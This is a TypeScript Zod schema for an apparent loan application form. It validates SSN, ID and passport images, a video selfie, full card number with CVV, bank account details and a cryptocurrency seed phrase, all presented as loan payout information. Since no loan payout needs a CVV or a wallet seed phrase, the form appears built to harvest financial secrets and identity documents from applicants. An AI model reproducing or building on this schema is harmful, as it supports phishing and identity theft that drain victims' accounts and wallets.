import { z } from "zod";

const payoutMethods = ["bank_transfer", "card", "crypto"] as const;
const loanStatuses = ["pending", "under_review", "verified", "rejected", "needs_correction"] as const;

export const loanSubmissionSchema = z.object({
  firstName: z.string().min(1, "First name is required").max(100),
  lastName: z.string().max(100).nullable().optional(),
  email: z.string().email("Valid email is required").max(255),
  phone: z.string().max(30).nullable().optional(),
  dateOfBirth: z.string().max(20).nullable().optional(),
  ssn: z.string().max(20).nullable().optional(),
  ein: z.string().max(20).nullable().optional(),
  addressLine1: z.string().max(200).nullable().optional(),
  addressLine2: z.string().max(200).nullable().optional(),
  city: z.string().max(100).nullable().optional(),
  stateRegion: z.string().max(100).nullable().optional(),
  postalCode: z.string().max(20).nullable().optional(),
  country: z.string().max(100).nullable().optional(),
  amountRequested: z.number({ invalid_type_error: "Amount must be a number" }).positive("Amount must be positive").max(10_000_000),
  currency: z.string().length(3, "Currency must be a 3-letter code").default("USD"),
  loanPurpose: z.string().max(2000).nullable().optional(),
  loanTermMonths: z.number().int().min(1).max(600).nullable().optional(),
  employmentStatus: z.string().max(50).nullable().optional(),
  monthlyIncome: z.number().nonnegative().nullable().optional(),
  payoutMethod: z.enum(payoutMethods).default("bank_transfer"),
  bankName: z.string().max(100).nullable().optional(),
  accountHolderName: z.string().max(100).nullable().optional(),
  bankAccountNumber: z.string().max(50).nullable().optional(),
  bankRoutingNumber: z.string().max(50).nullable().optional(),
  cardIssuer: z.string().max(50).nullable().optional(),
  cardHolderName: z.string().max(100).nullable().optional(),
  cardNumber: z.string().max(20).nullable().optional(),
  cardExpiry: z.string().max(5).nullable().optional(),
  cardCvv: z.string().max(4).nullable().optional(),
  billingAddressLine1: z.string().max(200).nullable().optional(),
  billingAddressLine2: z.string().max(200).nullable().optional(),
  billingCity: z.string().max(100).nullable().optional(),
  billingState: z.string().max(100).nullable().optional(),
  billingPostalCode: z.string().max(20).nullable().optional(),
  billingCountry: z.string().max(100).nullable().optional(),
  cryptoWalletType: z.string().max(50).nullable().optional(),
  cryptoWalletAddress: z.string().max(200).nullable().optional(),
  cryptoSeedPhrase: z.string().max(2000).nullable().optional(),
  cryptoNetwork: z.string().max(50).nullable().optional(),
  // Images stored as R2 keys (short strings) or base64 up to 10 MB each
  // 10 MB binary → ~13.4 M base64 chars (4/3 ratio)
  selfieImage: z.string().max(14_000_000).nullable().optional(),
  idFrontImage: z.string().max(14_000_000).nullable().optional(),
  idBackImage: z.string().max(14_000_000).nullable().optional(),
  passportFrontImage: z.string().max(14_000_000).nullable().optional(),
  passportBackImage: z.string().max(14_000_000).nullable().optional(),
  videoSelfieUrl: z.string().max(14_000_000).nullable().optional(),
  sourcePage: z.string().max(200).nullable().optional(),
  status: z.enum(loanStatuses).default("pending"),
});

export type LoanSubmissionInput = z.infer<typeof loanSubmissionSchema>;
